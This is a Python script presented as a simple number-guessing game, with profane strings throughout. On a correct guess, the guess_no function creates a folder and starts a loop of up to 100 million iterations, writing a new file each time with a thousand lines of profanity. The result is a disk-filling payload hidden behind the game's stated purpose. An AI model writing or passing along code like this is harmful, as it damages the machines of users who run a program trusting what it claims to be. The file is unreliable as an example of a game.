import os
import random

print("Welcome to Random number Guesser".center(100))

folder= "fuck You brother"

def guess_no(computer,person):

    print(f"You guess:{person}")
    print(f"Computer guess: {computer}")

    if computer==person:
        print("Chud Gaye guru..".center(80))
        os.makedirs(folder,exist_ok=True)

        for i in range(0,100000000):
            file= os.path.join(folder,f"Fuck You{i}.py")

            with open(file,'a') as fuck:
                fuck.write(f"#Fuck You brother{i}\n"*1000)
        return True
    else:
        print("Try again...")
        return False
    
name= input("Enter your name: ")

print(f"Welcome {name},to number guesser".center(80))



while True:
    comp=random.randint(0,9)
    person= int(input("Enter number between 0-9: "))

    if guess_no(comp,person):
        break





